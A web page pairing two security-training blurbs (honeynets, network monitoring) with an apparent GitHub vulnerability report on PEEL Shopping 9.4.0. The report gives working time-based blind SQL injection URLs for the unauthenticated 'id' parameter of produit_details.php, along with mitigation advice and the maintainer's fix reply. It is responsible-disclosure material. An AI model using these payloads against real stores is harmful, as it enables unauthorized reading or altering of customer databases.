#### Honeynet: Catching Suspicious Network Activities

Read more

A honeynet is a network set up with intentional
vulnerabilities; its purpose is to invite attack, so
that an attacker's activities and methods can be
studied and that information used to increase
network security. A honeynet contains one or
more honey pots, which are computer systems on
the Internet expressly set up to attract and "trap"
people who attempt to penetrate other people's
computer systems. Although the primary purpose
of a honeynet is to gather information about
attackers' methods and motives, the decoy
network can benefit its operator in other ways,
for example by diverting attackers from a real
network and its resources.
A complete background to the evolution of
honeypots followed by an introduction to the
Honeynet technologies, which will cover on
primary goals fpr using honeynet approach to
observe data flow and network analysis.
Extracting high interaction activity using Thug,
which will focus on web application centric
honeypot, analysis of attacks against low
interaction honeypots using Dionaea, using
honeypots for automated malware collection and
analysis, and an introduction to client honeypots.
Hopefully, with both informative and fun, aiming
to show you how honeypots can be used in the
real world to improve your information security.

#### Network Security Monitoring

Read more

Network security is not just about trying to build an impenetrable
wall that no attacker can breach. After all, experienced security
analysts know that there are no impenetrable walls, and a
determined attacker will get into a network eventually. Effective
network security requires not just preventing attacks, but
catching attackers as soon as they get through and keeping them
from getting to sensitive material. Network security monitoring is
the collection, analysis, and escalation of indications and
warnings in order to detect and respond to intrusions.
This training is your guide to deploying, building, and running a
network security monitoring operation, no prior experience
required. In addition, its focus on open source software and
vendor-neutral tools will help you to avoid costly and inflexible
solutions.

| **Vulnerability Name:** SQL Injection in "*produit\_details.php?id*" parameter  **Date of Discovery:** 10 July 2021  **Product version:** 9.4.0 . [Download link](https://drive.google.com/file/d/1FM8du7J6DDxE-LwVmH8JI502vvom-DUU/view?usp=sharing)  **Author:** faisalfs10x  **Vulnerability Description:** Public user/guest (unauthenticated) can inject malicious SQL query in order to affect the execution of predefined SQL commands via the "*id*" parameter on the "*/peel-shopping\_9\_4\_0/achat/produit\_details.php?id=[SQLi]*" endpoint. Upon successful of SQL injection attack, attacker can read sensitive data from the database or modify database data.  **Vulnerable URL:** *[http://localhost/peel-shopping\_9\_4\_0/achat/produit\_details.php?id=[SQLi]](http://localhost/peel-shopping_9_4_0/achat/produit_details.php?id=%5BSQLi%5D)*  **Proof of Concept:**  **1)** Assumed peel-shopping\_9\_4\_0 out of box installation database name is *peel*. This query will check if *database()* name like *hex(%peel%)* - it will delay for 7 seconds before redirect to homepage (<http://localhost/peel-shopping_9_4_0/>) that indicates TRUE SQL statement which mean the database name like "*peel*".  **url :** <http://localhost/peel-shopping_9_4_0/achat/produit_details.php?id=(SELECT+1337+FROM+(SELECT(SLEEP(7-(IF(DATABASE()+LIKE+0x257065656c25,0,5)))))FSXX)>  [PoC enum db name] [enum_dbname](https://user-images.githubusercontent.com/51811615/125202026-5ac05480-e2a4-11eb-8aa8-0bd79718769f.png)  **2)** Assumed the web is using MariaDB database server - check if db\_version like *hex(%MariaDB%)*, it will delay for 5 seconds if TRUE.  **url :** <http://localhost/peel-shopping_9_4_0/achat/produit_details.php?id=(SELECT+1337+FROM+(SELECT(SLEEP(5-(IF(VERSION()+LIKE+0x254d61726961444225,0,5)))))FSXX)>  [Poc enum MariaDB] [enum_dbversion(MariaDB)](https://user-images.githubusercontent.com/51811615/125202107-b68add80-e2a4-11eb-8b16-5f03eedcb275.PNG)  **3)** By default, the database have a table name = peel\_produits. This query will check if table\_name *peel\_produits* is exist, it will delay for 10 seconds if TRUE, else will redirect to homepage instantly.  **url :** <http://localhost/peel-shopping_9_4_0/achat/produit_details.php?id=(SELECT+1337+FROM+(SELECT(SLEEP(10-(IF(EXISTS(SELECT+3+FROM+peel.peel_produits),0,5)))))FSXX)>  [PoC enum table peel\_produits] [enum_tablename](https://user-images.githubusercontent.com/51811615/125202148-d91cf680-e2a4-11eb-95fe-5dd3c633f285.png)  To produce SQL syntax error, it is possible to intercept the request before it is redirect to homepage using a tool like BurpSuite (repeater).  **Error syntax:** <http://localhost/peel-shopping_9_4_0/achat/produit_details.php?id=(SELECT+1337+FROM+(SELdECT(SLEEP(3-(IF(USER()+LIKE+0xGEN_ERROR,0,5)))))ERR)>   1. [MariaDB disclosed image]    [sql_error_mariadb](https://user-images.githubusercontent.com/51811615/125202162-e934d600-e2a4-11eb-8a08-9086e37f1706.png) 2. [peel\_produits table\_name disclosed]    [sql_errorbased2](https://user-images.githubusercontent.com/51811615/125202167-efc34d80-e2a4-11eb-9158-a66b2297eff3.png)   **Dump table name = peel\_profil**  [dump_table_peel_profil](https://user-images.githubusercontent.com/51811615/125201991-2b114c80-e2a4-11eb-9c16-3a5197bcb51a.PNG)  **Consequences:**   * Confidentiality: Since SQL databases generally hold sensitive data, loss of confidentiality is a frequent problem with SQL Injection vulnerabilities. * Integrity: Just as it may be possible to read sensitive information eg client/customer sensitive data, it is also possible to make changes or even delete this information with a SQL Injection attack.   **Mitigation:** Use of Prepared Statements (with Parameterized Queries). It would be good also to casting integer to ensure only numerical data is inserted in 'id' parameter eg - intval($\_GET['id']) cc [@advisto](https://github.com/advisto)  **References for Mitigation Vulnerability:** <https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html> |

### **[advisto](/advisto)** commented [Jul 13, 2021](#issuecomment-879152503)

| Thanks.  This was due to a change of structure to get product details, in order to potentially link it to a product API instead of reading data from MySQL. The previously done protection was no more active, thus it was necessary to add an intval on the GET parameter.  => Subject closed |

| So, i noticed you made code changes on this line right. file *produit\_details.php* . But, the bug is still affected on version 9.3.0 anyway.  [code_changes](https://user-images.githubusercontent.com/51811615/125488100-3501eadb-9809-4c9f-9823-4dd95044c213.PNG) |
